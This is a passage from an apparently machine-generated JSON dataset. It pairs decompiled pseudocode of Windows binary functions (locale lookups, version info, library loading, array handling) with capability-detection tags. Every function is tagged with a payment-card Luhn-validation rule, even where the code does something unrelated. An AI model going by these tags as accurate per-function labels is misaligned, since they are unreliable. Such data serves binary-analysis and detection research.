        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004098f4(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch._0_1_ = 0;\n    var_14h._0_1_ = 0;\n    arg_8h_00 = 1;\n    fcn.004088c0(1, &var_20h, 4);\n    fcn.00409890(arg_8h_00);\n    return;\n}\n",
        "token_count": 150
    },
    "0040a408": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a408(uint param_1, int32_t param_2)\n\n{\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    \n    if (param_2 == 0) {\n        fcn.00409c54(&stack0xfffffffc);\n    }\n    else {\n        fcn.00409c54(&stack0xfffffffc);\n    }\n    fcn.00404098();\n    return;\n}\n",
        "token_count": 104
    },
    "0040a530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a530(int32_t param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack32 = 0x40a5a9;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.0040a478();\n        puStack40 = &fcn.0040a530::var_8h;\n        fcn.00404268();\n        fcn.004044c8();\n        iVar2 = fcn.00407ce0();\n        puVar1 = puStack28;\n        if (iVar2 == 0) {\n            iVar2 = fcn.00404268();\n            *param_2 = *param_2 + iVar2;\n            puVar1 = puStack28;\n        }\n    }\n    puStack28 = puVar1;\n    *in_FS_OFFSET = puStack40;\n    uStack32 = 0x40a5b0;\n    iStack36 = 0x40a5a8;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 344
    },
    "0040aca4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040aca4(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    double dStack28;\n    \n    uVar3 = 1;\n    cVar1 = fcn.0040a738();\n    if (cVar1 == '\\0') {\ncode_r0x0040acef:\n        uVar3 = fcn.0040ac70();\n    }\n    else {\n        iVar2 = fcn.00404268();\n        if (0 < iVar2) {\n            cVar1 = fcn.0040aa7c();\n            if (cVar1 == '\\0') goto code_r0x0040acef;\n        }\n        if (dStack28 < *0x40ad2c) {\n            *param_2 = dStack28 - 0.0;\n        }\n        else {\n            *param_2 = dStack28 + 0.0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 226
    },
    "0040ad30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040ad30(void)\n\n{\n    int32_t iVar1;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack276;\n    uchar *puStack272;\n    uint uStack268;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0;\n    uStack268 = 0x100;\n    puStack272 = &stack0xfffffefc;\n    uStack276 = 0;\n    uStack284 = 0;\n    uStack288 = 0x3200;\n    uStack292 = 0x40ad54;\n    for (iVar1 = sub.kernel32.dll_FormatMessageA();\n        (0 < iVar1 && (((&stack0xfffffedf)[iVar1] < 0x21 || ((&stack0xfffffedf)[iVar1] == 0x2e)))); iVar1 = iVar1 + -1)\n    {\n    }\n    uStack292 = 0x40ad73;\n    fcn.00404098();\n    return;\n}\n",
        "token_count": 234
    },
    "0040ad7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ad7c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint lpLCData;\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (iVar1 < 1) {\n        fcn.00403ffc();\n    }\n    else {\n        fcn.00404098();\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "0040ae2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040ae2c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    var_18h = 0;\n    uStack48 = 0x40af3f;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    var_4h = sub.kernel32.dll_GetThreadLocale_1();\n    iVar1 = 1;\n    do {\n        fcn.0040adf0(&var_ch, 0xb, &stack0xfffffffc);\n        fcn.00403ffc();\n        fcn.0040adf0(&var_10h, 0xb, &stack0xfffffffc);\n        fcn.00403ffc();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 0xd);\n    iVar1 = 1;\n    do {\n        var_8h = (iVar1 + 5) % 7;\n        fcn.0040adf0(&var_14h, 6, &stack0xfffffffc);\n        fcn.00403ffc();\n        fcn.0040adf0(&var_18h, 6, &stack0xfffffffc);\n        fcn.00403ffc();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 8);\n    *in_FS_OFFSET = uStack52;\n    fcn.00403fcc(0x40af46);\n    return;\n}\n",
        "token_count": 432
    },
    "0040b004": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040b004(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    code **in_FS_OFFSET;\n    code *in_stack_ffffffc4;\n    code *pcStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack20 = 0x40b09b;\n    pcStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &pcStack24;\n    puVar3 = &var_4h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040ad7c(puVar3);\n    iVar1 = fcn.00407fc8();\n    if (iVar1 - 3U < 3) {\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 4);\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040af50, uVar2);\n        iVar4 = 7;\n        puVar3 = 0x46376c;\n        do {\n            *puVar3 = 0xffffffff;\n            puVar3 = puVar3 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 3);\n        in_stack_ffffffc4 = fcn.0040af8c;\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040af8c, uVar2);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    fcn.00403fa8(0x40b0a2);\n    return;\n}\n",
        "token_count": 404
    },
    "0040b2e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040b2e8(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_EDX;\n    uint var_458h;\n    uint *var_358h;\n    uint var_354h;\n    uint *var_350h;\n    uint var_34ch;\n    int32_t var_348h;\n    uint var_344h;\n    int32_t var_340h;\n    uint var_33ch;\n    uint var_338h;\n    uint var_334h;\n    uint var_330h;\n    int32_t var_32ch;\n    int32_t var_320h;\n    uint var_312h;\n    uint var_212h;\n    uint var_10dh;\n    int32_t var_8h;\n    uint var_4h;\n    \n    sub.kernel32.dll_VirtualQuery_1();\n    if (var_320h == 0x1000) {\n        iVar3 = var_32ch;\n        iVar2 = sub.kernel32.dll_GetModuleFileNameA_1(var_32ch, &var_212h, 0x105);\n        if (iVar2 != 0) {\n            var_8h = in_EDX - var_32ch;\n            goto code_r0x0040b35e;\n        }\n    }\n    iVar3 = *0x463664;\n    sub.kernel32.dll_GetModuleFileNameA_1();\n    var_8h = fcn.0040b2dc();\ncode_r0x0040b35e:\n    fcn.0040c378(iVar3);\n    fcn.00408640();\n    var_340h = 0x40b468;\n    var_338h = 0x40b468;\n    cVar1 = fcn.004033e4();\n    if (cVar1 != '\\0') {\n        var_340h = fcn.00404468();\n        iVar3 = fcn.004085dc();\n        if ((iVar3 != 0) && (*(var_340h + -1 + iVar3) != '.')) {\n            var_338h = 0x40b46c;\n        }\n    }\n    uVar4 = fcn.00405044(*(*0x4621d4 + 4), &var_312h, 0x100);\n    sub.user32.dll_LoadStringA_1(uVar4);\n    fcn.004031a8();\n    var_358h = &var_458h;\n    var_354h._0_1_ = 4;\n    var_350h = &var_10dh;\n    var_34ch._0_1_ = 6;\n    var_348h = var_8h;\n    var_344h._0_1_ = 5;\n    var_33ch._0_1_ = 6;\n    var_334h._0_1_ = 6;\n    fcn.00408c78(4, &var_358h);\n    fcn.004085dc();\n    return;\n}\n",
        "token_count": 692
    },
    "0040b538": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b538(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403ffc();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 130
    },
    "0040b574": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b574(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack40 = 0x40b588;\n        fcn.0040357c();\n    }\n    uStack44 = 0x40b5ce;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h_00 = &fcn.0040b574::var_4h;\n    puStack40 = &stack0xfffffffc;\n    fcn.00408cb8(arg_8h_00);\n    fcn.00403ffc();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack44 = 0x40b5d5;\n    iStack48 = 0x40b5cd;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 261
    },
    "0040b5f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b5f4(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00405b0c();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 134
    },
    "0040b630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b630(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack44 = 0x40b646;\n        fcn.0040357c();\n    }\n    uStack48 = 0x40b69c;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    arg_8h_00 = &fcn.0040b630::var_4h;\n    puStack44 = &stack0xfffffffc;\n    fcn.00405b0c();\n    fcn.00408cb8(arg_8h_00);\n    fcn.00403ffc();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack48 = 0x40b6a3;\n    iStack52 = 0x40b69b;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 276
    },
    "0040b7c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040b7c4(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack56 = 0x40b860;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    if (in_EAX == 0) {\n        fcn.00405b0c();\n    }\n    else {\n        puStack52 = &stack0xfffffffc;\n        fcn.00404040();\n    }\n    var_1ch = var_4h;\n    var_18h._0_1_ = 0xb;\n    var_10h._0_1_ = 0xb;\n    var_8h._0_1_ = 0;\n    arg_ch = &var_1ch;\n    arg_8h = 2;\n    var_14h = param_2;\n    fcn.00405b0c();\n    fcn.0040b574(arg_8h, arg_ch);\n    *in_FS_OFFSET = arg_8h;\n    uStack60 = 0x40b867;\n    fcn.00403fa8();\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 391
    },
    "0040b880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b880(uint arg_8h)\n\n{\n    fcn.0040b7c4();\n    fcn.0040b870();\n    return;\n}\n",
        "token_count": 42
    },
    "0040b8b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040b8b4(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    unkbyte3 Var3;\n    int32_t iVar2;\n    \n    iVar1 = *in_EAX;\n    Var3 = iVar1 >> 8;\n    if (iVar1 < -0x3fffff6d) {\n        iVar2 = iVar1;\n        if (iVar1 == -0x3fffff6e) {\ncode_r0x0040b918:\n            return CONCAT31(iVar2 >> 8, 6);\n        }\n        if (iVar1 < -0x3fffff71) {\n            if (iVar1 == -0x3fffff72) {\n                return CONCAT31(Var3, 7);\n            }\n            if (iVar1 == -0x3ffffffb) {\n                return 0xb;\n            }\n            if (iVar1 == -0x3fffff74) {\n                return 4;\n            }\n            iVar2 = iVar1 + 0x3fffff73;\n            if (iVar2 == 0) goto code_r0x0040b921;\n        }\n        else {\n            iVar2 = iVar1 + 0x3fffff6f;\n            if (iVar1 + 0x3fffff71U < 2) goto code_r0x0040b918;\n            if (iVar2 == 0) {\n                return 8;\n            }\n        }\n    }\n    else if (iVar1 < -0x3fffff69) {\n        if (iVar1 == -0x3fffff6a) {\n            return CONCAT31(Var3, 0xc);\n        }\n        iVar2 = iVar1 + 0x3fffff6d;\n        if (iVar2 == 0) {\ncode_r0x0040b921:\n            return CONCAT31(iVar2 >> 8, 9);\n        }\n        if (iVar1 == -0x3fffff6c) {\n            return 3;\n        }\n        iVar2 = iVar1 + 0x3fffff6b;\n        if (iVar2 == 0) {\n            return 5;\n        }\n    }\n    else {\n        if (iVar1 == -0x3fffff03) {\n            return 0xe;\n        }\n        iVar2 = iVar1 + 0x3ffffec6;\n        if (iVar2 == 0) {\n            return 0xd;\n        }\n    }\n    return CONCAT31(iVar2 >> 8, 0x16);\n}\n",
        "token_count": 552
    },
    "0040bd88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get file version info"
        ],
        "decompiled_code": "\nvoid fcn.0040bd88(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa0;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint puLen;\n    int32_t lplpBuffer;\n    uint pBlock;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack40 = 0x40be5e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    var_4h = 0xffffffff;\n    puStack48 = 0x40bdb5;\n    fcn.00404040();\n    puStack48 = 0x40bdbd;\n    fcn.004044b8();\n    puStack48 = &fcn.0040bd88::var_ch;\n    uStack52 = 0x40bdc9;\n    uStack52 = fcn.00404468();\n    puStack56 = 0x40bdcf;\n    iVar1 = sub.version.dll_GetFileVersionInfoSizeA();\n    if (iVar1 != 0) {\n        puStack56 = 0x40bddc;\n        pBlock = fcn.004026bc();\n        uStack60 = 0x40be41;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        uVar2 = fcn.00404468(var_ch, iVar1, pBlock);\n        iVar1 = sub.version.dll_GetFileVersionInfoA(uVar2);\n        if (iVar1 != 0) {\n            in_stack_ffffffa0 = pBlock;\n            iVar1 = sub.version.dll_VerQueryValueA(pBlock, 0x40be70, &fcn.0040bd88::lplpBuffer, &fcn.0040bd88::puLen);\n            if (iVar1 != 0) {\n                var_4h = *(lplpBuffer + 8);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffa0;\n        fcn.004026dc(0x40be48);\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    uStack44 = 0x40be65;\n    puStack48 = 0x40be5d;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 595
    },
    "0040c3e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get geographical location"
        ],
        "decompiled_code": "\nvoid fcn.0040c3e0(void)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint lpLCData;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x40c444;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    uVar1 = 7;\n    sub.kernel32.dll_GetLocaleInfoA_1();\n    fcn.00404218();\n    sub.kernel32.dll_GetACP(0);\n    fcn.00407fc8();\n    *in_FS_OFFSET = in_EAX;\n    fcn.00403fa8(0x40c44b, uVar1);\n    return;\n}\n",
        "token_count": 189
    },
    "0040c9c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040c9c0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x40ca50;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    iVar1 = sub.kernel32.dll_GetLastError();\n    if (iVar1 == 0) {\n        iVar2 = fcn.0040b5f4();\n    }\n    else {\n        var_ch._0_1_ = 0;\n        var_10h = iVar1;\n        fcn.0040ad30();\n        var_8h = 0;\n        var_4h._0_1_ = 0xb;\n        in_stack_ffffffd0 = 1;\n        iVar2 = fcn.0040b630(1, &var_10h);\n    }\n    *(iVar2 + 0xc) = iVar1;\n    fcn.004039e4();\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    uStack40 = 0x40ca57;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 340
    },
    "0040cc5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040cc5c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    *(in_EAX + 0xc) = 0xffff;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0xffffffff, 0);\n    *(in_EAX + 0x10) = uVar1;\n    uVar2 = 0;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n    *(in_EAX + 0x14) = uVar1;\n    *(in_EAX + 0x18) = 0xffffffff;\n    uVar1 = fcn.00403228();\n    *(in_EAX + 0x20) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 290
    },
    "0040cfe8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040cfe8(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x40cff7;\n    uStack24 = param_2;\n    sub.kernel32.dll_SetErrorMode();\n    uStack32 = 0x40d05a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x40d03c;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.00404468();\n    sub.kernel32.dll_LoadLibraryA();\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 251
    },
    "0040e364": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040e364(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x40e3f3;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00410054();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.00410054();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.00405b0c();\n    fcn.0040b574(arg_8h, arg_ch);\n    fcn.004039e4();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x40e3fa;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 307
    },
    "0040e454": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040e454(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x40e4e3;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00410054();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.00410054();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.00405b0c();\n    fcn.0040b574(arg_8h, arg_ch);\n    fcn.004039e4();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x40e4ea;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 307
    },
    "0040e840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040e840(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "0040e870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e870(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.0040e870(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 237
    },
    "0040e8cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040e8cc(void)\n\n{\n    char cVar1;\n    uint16_t *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint plLbound;\n    uint ppvData;\n    uint var_310h;\n    int32_t plUbound;\n    uint16_t *psa;\n    uint pvarg;\n    uint var_300h;\n    uint var_2fch;\n    uint rgIndices;\n    \n    if ((*(in_EAX + 1) & 0x20) == 0) {\n        fcn.0040e798();\n    }\n    if ((*in_EAX & 0xfff) == 0xc) {\n        if ((*in_EAX & 0x4000) == 0) {\n            psa = *(in_EAX + 4);\n        }\n        else {\n            psa = **(in_EAX + 4);\n        }\n        uVar2 = *psa;\n        if (-1 < uVar2 - 1) {\n            iVar7 = 0;\n            piVar6 = &var_300h;\n            uVar5 = uVar2;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar7 + 1, piVar6 + 1);\n                fcn.0040e798();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.0040e798();\n                *piVar6 = (plUbound - piVar6[1]) + 1;\n                iVar7 = iVar7 + 1;\n                piVar6 = piVar6 + 2;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (-1 < uVar2 - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.0040e840(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex();\n                fcn.0040e798();\n                fcn.0040eac4();\n            }\n            cVar1 = fcn.0040e870(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    sub.oleaut32.dll_VariantClear(in_EAX);\n    fcn.0040e798();\n    return;\n}\n",
        "token_count": 638
    },
    "0040eae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
